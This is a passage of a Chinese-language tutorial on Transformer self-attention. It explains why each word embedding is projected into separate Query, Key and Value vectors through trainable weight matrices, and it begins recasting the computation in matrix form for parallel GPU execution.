<p>建议你将前面的自注意力计算过程亲手推导一遍。这种“笨功夫”能帮你建立起扎实的直觉——当你亲手用数字演算过注意力如何流动后，对后续抽象概念的理解会清晰得多。如果你已经完全掌握了上一部分，那么恭喜你，你已经非常接近Transformer的核心了。接下来我们更进一步。</p>
<p>还是上面的例子，让我们仔细观察这个流程图。你会发现，同一个词嵌入向量需要同时承担三种不同的角色：
第一，作为<strong>查询者</strong>（蓝色部分），它要主动去“询问”自己与其他向量的关系；
第二，作为<strong>被查询者</strong>（橙色部分），它被动地接受其他向量的“询问”，并提供比较的依据；
第三，作为<strong>输出内容</strong>（紫色部分），它最终要参与加权求和，构成新表示的一部分。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/164707cfe9f145eca60699aa6a290280~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=UEHAbc1Ve3ihLSmKD%2BSXegmN3Ec%3D" alt="c7.jpg" width="100%" loading="lazy"/></p>
<p>让一个向量同时完成这三项任务，就像让一位演员在同一幕戏中分饰三个角色——虽然可能做到，却难免顾此失彼、表达受限。在计算意义上，这种“身兼数职”会导致向量维度被迫承载多种相互冲突的语义信息，从而降低模型的表达效率与灵活性。</p>
<p>于是很自然地，我们想到一个改进方案：<strong>将原来单一的向量拆分成三个独立的向量，让它们各司其职</strong>。如何拆分呢？我们引入三个可训练的权重矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>、<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 与 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，分别用于生成<strong>查询向量（Query）、键向量（Key）与值向量（Value）</strong>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo>⋅</mo><msub><mi>W</mi><mi>k</mi></msub><mspace linebreak="newline"/><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo>⋅</mo><msub><mi>W</mi><mi>q</mi></msub><mspace linebreak="newline"/><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo>⋅</mo><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">x_{i}^{k} = x_{i} \cdot W_{k}
\\ x_{i}^{q} = x_{i} \cdot W_{q}
\\ x_{i}^{v} = x_{i} \cdot W_{v}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1461em;vertical-align:-0.247em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.9614em;vertical-align:-0.247em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5945em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48888eb7d02f43c988913cdd9ed2d710~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=%2FZMojg4rM6jmQbazwcDxEWJcFtA%3D" alt="c8.jpg" width="100%" loading="lazy"/></p>
<p>这样一来，每个词向量通过三个不同的线性变换，演化出三个分工明确的“化身”：</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span></span></span></span></span> 专注于表达“我想关注什么”，</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1078em;vertical-align:-0.2587em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span></span> 专注于表达“我能提供什么特征用于被匹配”，</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9231em;vertical-align:-0.2587em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span></span> 则纯粹承载“我本身的实际内容”。</li>
</ul>
<p>后续的注意力计算流程与之前完全一致，只是将原先的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 替换为对应的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo separator="true">,</mo><mi>k</mi><mo separator="true">,</mo><mi>v</mi></mrow><annotation encoding="application/x-tex">q, k, v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></span>：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89bab2de19204c1bb276eabda0a23c9d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=G5IPUzBek5b120E9Dsadwbc79JA%3D" alt="c9.jpg" width="100%" loading="lazy"/></p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub><mo separator="true">,</mo><msub><mi>W</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_q, W_k, W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 作为可训练的参数，使得模型能够通过数据自动学习到<strong>最适合当前任务的注意力模式</strong>。相比之前固定使用原始向量进行点积的“硬编码”方式，这种可学习的拆分机制极大增强了模型的表达能力。</p>
<p>从语义分工的角度来看，这种设计赋予模型更细腻的注意力调控能力，QKV根据自己不同的职责，表达不同的语义信息，这样模型自然而然就会有更强的表达能力。</p>
<ul>
<li><strong>Query</strong> 体现了一种“主动性”，相当于在问：“我现在需要什么样的信息”</li>
<li><strong>Key</strong> 体现了一种“应答性”，相当于在回答：“我这里有这样的特征”</li>
<li><strong>Value</strong> 则是真正被传递的实质内容，匹配成功后贡献到输出中。</li>
</ul>
<p>各环节专业分工，整个系统才能高效运转、灵活适应复杂任务。<strong>这正印证了亚当·斯密的那句话：分工是提高效率的源泉。</strong> 在注意力机制中，Query、Key、Value的明确职责划分与专业化，便是模型智能得以涌现的效率之源。</p>
<hr/>
<p>接下来，让我们从<strong>矩阵的视角</strong>重新审视并实现上述的注意力计算过程。如果使用循环逐个处理上述流程，虽然很直观，但在实际计算的时候会非常低效。而将这些操作转化为矩阵运算，不仅能让表达更加简洁，更重要的是能够充分利用现代硬件（尤其是GPU）强大的<strong>并行计算能力</strong>，实现极致的加速。</p>
<p><strong>注意：下面的计算过程有点绕，推荐自己拿笔在草稿纸上自己推一篇，尤其是要注意每个矩阵的形状</strong></p>
<p>我们首先将整个序列形式化。假设序列长度为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span>，每个词的特征维度为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>，那么整个输入序列很自然地可以表示为一个形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, embed\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span> 的矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>。每一行 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">X[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span> 就对应一个词的嵌入向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。Transformer 的核心目标，正是将这个输入矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>，通过一系列可学习的注意力操作，转化为一个蕴含了丰富上下文信息的输出矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>，其形状通常与 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> 保持一致。</p>
<p>为了实现可学习的注意力，我们需要引入三组独立的权重矩阵：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>、<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span 